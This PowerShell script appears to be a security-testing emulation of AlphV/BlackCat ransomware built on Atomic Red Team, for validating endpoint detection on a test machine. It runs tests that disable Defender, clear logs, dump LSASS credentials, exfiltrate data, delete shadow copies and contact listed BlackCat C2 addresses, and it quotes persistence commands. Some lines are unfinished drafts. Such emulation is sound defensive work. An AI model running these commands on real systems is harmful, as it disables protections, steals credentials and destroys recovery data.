# AlphV Ransomware Atomic Simulation
# Author : Sebastian Kandler (@skandler)
# Date : 02/07/2024
# Simulate AlphV Ransomware tactics, techniques, and procedures (TTP) with atomic red team and some own tests to validate security controls
#
# Recommend to run it also without pattern based malware protection, to verify EDR behaviour based detections, otherwise pattern based AV will block most of the tools. An attacker who does obfuscation of these attack tools, wont be detected by pattern based av.
# Expect that attackers will turn off your EDR Solution like in steps 22-24, how do you detect and protect without EDR? running it without EDR will also test your system hardening settings like Windows Credential Dump Hardening settings like LSA Protect or Credential guard. 
#
# Prerequisite: https://github.com/redcanaryco/invoke-atomicredteam - works best with powershell 7
#
#
# please run on a test machine and reinstall afterwards
#
# see detailled descriptions of tests at github readme files for atomics for example for T1003: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md
#
# References
# https://cybersecurity.att.com/blogs/labs-research/blackcat-ransomware
# https://github.com/attackevals/ael/blob/main/ManagedServices/alphv_blackcat/Emulation_Plan/ALPHV_BlackCat_Scenario.md
# https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/
# https://www.logpoint.com/en/blog/hunting-and-remediating-blackcat-ransomware/
# https://www.varonis.com/blog/blackcat-ransomware

Set-ExecutionPolicy Bypass -Force

function Test-Administrator  
{  
    [OutputType([bool])]
    param()
    process {
        [Security.Principal.WindowsPrincipal]$user = [Security.Principal.WindowsIdentity]::GetCurrent();
        return $user.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator);
    }
}

if(-not (Test-Administrator))
{
    Write-Error "This script must be executed as Administrator.";
    exit 1;
}

$Logfile = $MyInvocation.MyCommand.Path -replace '\.ps1$', '.log'
Start-Transcript -Path $Logfile

if (Test-Path "C:\AtomicRedTeam\") {
   Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
}
else {
  IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1'); Install-AtomicRedTeam -getAtomics -Force
  Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
}

# Test #1 - ADRecon Script 
# noch bauen, prereqs RSAT and .NET
#bitsadmin /transfer ovr /download http://the-inator.com/digirevenge/ADRecon.ps1 C:\temp\ADRecon.ps1
#C:\temp\ADRecon.ps1 -Collect GroupMembers, Computers -OutputType CSV

# set powershell execution policy to unrestricted and unblock file
powershell.exe -c "$ep=Get-ExecutionPolicy;If ($ep -ne 'Unrestricted') {Set-ExecutionPolicy Unrestricted  -scope CurrentUser -Force}
powershell.exe -c "Unblock-File C:\Users\xxx\AppData\Local\Temp\ADRecon.ps1 C:\Users\xxx\AppData\Local\Temp\ADRecon.ps1; 

# Atomic Test - T1069.002 - Adfind - Query Active Directory Groups
Invoke-AtomicTest T1069.002 -TestGuids 48ddc687-82af-40b7-8472-ff1e742e8274

# BlackCat uses “wmic.exe' to retrieve system UUID from the SMBIOS
cmd.exe /c "wmic csproduct get UUID"

# Atomic Test # - T1105 - Windows - BITSAdmin BITS Download for Downloading Infostealer
Invoke-AtomicTest T1105 -TestGuids a1921cd3-9a2d-47d5-a891-f1d0f2a7a31b

# Test #3 - Infostealer
# noch bauen

# Atomic Test # - T1562.001 - Tamper with Windows Defender ATP PowerShell
Invoke-AtomicTest T1562.001 -TestGuids 6b8df440-51ec-4d53-bf83-899591c9b5d7

# Atomic Test # - T1562.001 - Disable Windows Defender with PwSh Disable-WindowsOptionalFeature
Invoke-AtomicTest T1562.001 -TestGuids f542ffd3-37b4-4528-837f-682874faa012

#The anti-rootkit tool Gmer was loaded into a small number of key systems. We believe the attackers used this to disable endpoint protection.
#c:\users\<username>\downloads\gmer\gmer.exe
# http://www.gmer.net/?m=0

# Atomic Test # - T1562.002 - Disable Event Logging with wevtutil
Invoke-AtomicTest T1562.002 -TestGuids b26a3340-dad7-4360-9176-706269c74103

# Atomic Test # - T1112 - Modify registry to store logon credentials
Invoke-AtomicTest T1112 -TestGuids c0413fb5-33e2-40b7-9b6f-60b29f4a7a18

# Atomic Test # - T1003.001 - Dump LSASS.exe Memory using ProcDump
Invoke-AtomicTest T1003.001 -TestGuids 0be2230c-9ab3-4ac2-8826-3199b9a0ebf8 -GetPrereqs
Invoke-AtomicTest T1003.001 -TestGuids 0be2230c-9ab3-4ac2-8826-3199b9a0ebf8

# Atomic Test # - T1003.001 - Dump LSASS.exe Memory using direct system calls and API unhooking
Invoke-AtomicTest T1003.001 -TestGuids 7ae7102c-a099-45c8-b985-4c7a2d05790d -GetPrereqs
Invoke-AtomicTest T1003.001 -TestGuids 7ae7102c-a099-45c8-b985-4c7a2d05790d

# Atomic Test # - T1003.001 - Dump LSASS.exe Memory using comsvcs.dll
Invoke-AtomicTest T1003.001 -TestGuids 2536dee2-12fb-459a-8c37-971844fa73be

# own steal.exe application, maybe it´s https://github.com/moonD4rk/HackBrowserData
# https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/

# Atomic Test # - T1048.003 - Exfiltration Over Alternative Protocol - HTTP using Powershell
Invoke-AtomicTest T1048.003 -TestGuids 6aa58451-1121-4490-a8e9-1dada3f1c68c

# Atomic Test # - T1048.003 - Exfiltration Over Alternative Protocol - FTP - Rclone
Invoke-AtomicTest T1048.003 -TestGuids b854eb97-bf9b-45ab-a1b5-b94e4880c56b -GetPrereqs
Invoke-AtomicTest T1048.003 -TestGuids b854eb97-bf9b-45ab-a1b5-b94e4880c56b

# usage of Exmatter for per Powershell oder batch
# https://github.com/attackevals/ael/tree/main/ManagedServices/alphv_blackcat/Resources/payloads/alternative_payloads

# Atomic Test # - T1046 - Port-Scanning /24 Subnet with PowerShell
Invoke-AtomicTest T1046 -TestGuids 05df2a79-dba6-4088-a804-9ca0802ca8e4

# Portscan mit Empire https://www.infosecmatter.com/empire-module-library/?mod=powershell/situational_awareness/network/portscan

# Atomic Test # - T1569.002 - Use PsExec to execute a command on a remote host
Invoke-AtomicTest T1569.002 -TestGuids 873106b7-cfed-454b-8680-fa9f6400431c -GetPrereqs
Invoke-AtomicTest T1569.002 -TestGuids 873106b7-cfed-454b-8680-fa9f6400431c

# exploring for teamviewer installations
cmd.exe /q /c teamviewer.exe --getid cmd.exe /q /c dir c:"program files cmd.exe /q /c dir c:"program files (x86) 1 cmd.exe /q /c dir c:"program files (x86)\teamviewer\ cmd.exe /q /c c:"program files (x86)\teamviewer\teamviewer.exe --getid
cmd.exe /q /c c:"program files (x86)\teamviewer\teamviewer.exe -info"

# The following commands show the attackers exploring the keepass password manager config
cmd.exe /q /c dir c:"program files (x86)\
cmd.exe /q /c dir c:"program files (x86)"keepass password safe 2\
cmd.exe /q /c type c:"program files (x86)"keepass password safe 2\keepass.exe.config"

#C2 Tunnel with GOST
# https://v2.gost.run/
# https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/

# commands:
#It was also observed hidden by writing to an alternate data stream (ADS) of the C:\ directory using the following command:
#
#c:\windows\system32\windowspowershell\v1.0\powershell.exe -command  & {(get-content c:\system -raw | set-content c:\ -stream 'cachetask')}
#
#c:\windows\system32\schtasks.exe /create /ru system /sc minute /tn microsoft\windows\wininet\cachetask /tr c:\:cachetask -b <bind port> /f
#
#c:\windows\system32\schtasks.exe /run /tn microsoft\windows\wininet\cachetask
#
#The “image file execution option” debugger registry key was another way to ensure the malicious file would be persistently executed on the system:
#
#c:\windows\system32\reg.exe add hklm\software\microsoft\windows nt\currentversion\image file execution options\taskmgr.exe /v debugger /t reg_sz /d c:\system

# Connection to known C2 of BlackCat
tnc 52.149.228.45 -port 443
tnc 20.46.245.56 -port 443
tnc windows.menu -port 8443

# Blackcat Malware from MITRE Emulation_Plan
# 
# Alternativ als Batch Script https://github.com/attackevals/ael/blob/main/ManagedServices/alphv_blackcat/Resources/payloads/alternative_payloads/digirevenge.bat


# Atomic Test # - T1490 - Windows - Delete Volume Shadow Copies
Invoke-AtomicTest T1490 -TestGuids 43819286-91a9-4369-90ed-d31fb4da2c01

# Atomic Test # - T1490 - Windows - Delete Volume Shadow Copies via WMI
Invoke-AtomicTest T1490 -TestGuids 6a3ff8dd-f49c-4272-a658-11c2fe58bd88

# Atomic Test # - T1490 - Windows - Delete Volume Shadow Copies via WMI with PowerShell
Invoke-AtomicTest T1490 -TestGuids 39a295ca-7059-4a88-86f6-09556c1211e7

# Atomic Test # - T1490 - Windows - Disable Windows Recovery Console Repair
Invoke-AtomicTest T1490 -TestGuids cf21060a-80b3-4238-a595-22525de4ab81

# Atomic Test # - T1070.001 - Delete System Logs Using Clear-EventLog
Invoke-AtomicTest T1070.001 -TestGuids b13e9306-3351-4b4b-a6e8-477358b0b498

# Atomic Test # - T1491.001 - Replace Desktop Wallpaper
Invoke-AtomicTest T1491.001 -TestGuids 30558d53-9d76-41c4-9267-a7bd5184bed3

# drop ransomnote - fileending? 
# add

# Test # change lanman registry settings
cmd.exe /c reg add hkey_local_machine\system\currentcontrolset\services\lanmanserver\parameters /v maxmpxct /d 65535

# Atomic Test # - T1489 - Windows - Stop service by killing process
Invoke-AtomicTest T1489 -TestGuids f3191b84-c38b-400b-867e-3a217a27795f

# Atomic Test # - T1489 - Windows - Stop service by killing process
Invoke-AtomicTest T1489 -TestGuids 21dfb440-830d-4c86-a3e5-2a491d5a8d04



